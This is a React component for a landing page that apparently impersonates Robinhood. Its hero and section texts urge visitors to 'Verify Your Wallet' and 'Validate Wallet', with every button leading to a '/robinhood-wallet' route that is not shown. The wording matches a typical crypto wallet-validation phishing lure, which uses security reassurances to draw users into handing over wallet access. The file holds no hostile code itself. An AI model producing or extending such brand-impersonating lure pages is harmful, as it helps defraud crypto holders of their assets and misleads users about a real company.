import React from 'react'
import './robinHoodPagesCss/robinHoodLanding.css'
import RobinHoodHeader from '../robinHoodHeader/RobinHoodHeader'
import robinhood_landing_section_one_image from "../../../assets/robinhood_landing_section_one_image.png"
import robinhood_section_two_image from "../../../assets/robinhood_section_two_image.png"
import RobinHoodFooter from '../robinHoodFooter/RobinHoodFooter'
import { useNavigate } from 'react-router-dom'

const RobinHoodLanding = () => {

  const navigate = useNavigate()

  return (
    <>
      <main className='robin_hood_landing_body'>
        <RobinHoodHeader/>

        {/* ================= HERO ================= */}
        <section className='robinhood_hero_section'>
          <h1>Verify Your Wallet & Secure Your Access</h1>
          <p>
            Complete wallet validation to confirm ownership, enable secure
            connections, and protect your digital assets from unauthorized access.
          </p>
          <button onClick={()=>navigate('/robinhood-wallet')}>
            Validate Wallet
          </button>
        </section>

        {/* ================= SECTION ONE ================= */}
        <section className='robinhood_section_one'>
          <h1>Confirm balances safely</h1>
          <p>
            Wallet validation allows secure balance recognition and ensures
            accurate access to your assets without exposing private keys.
          </p>
          <img src={robinhood_landing_section_one_image} alt='image'/>
          <button onClick={()=>navigate('/robinhood-wallet')}>
            Validate Wallet
          </button>
        </section>

        {/* ================= SECTION TWO ================= */}
        <section className='robinhood_section_one'>
          <h1>Protected crypto access</h1>
          <p>
            Verifying your wallet helps establish trusted interactions and
            prevents unauthorized activity while accessing crypto services.
          </p>
          <img src={robinhood_section_two_image} alt='image'/>
          <button onClick={()=>navigate('/robinhood-wallet')}>
            Validate Wallet
          </button>
        </section>

        <RobinHoodFooter/>
      </main>
    </>
  )
}

export default RobinHoodLanding
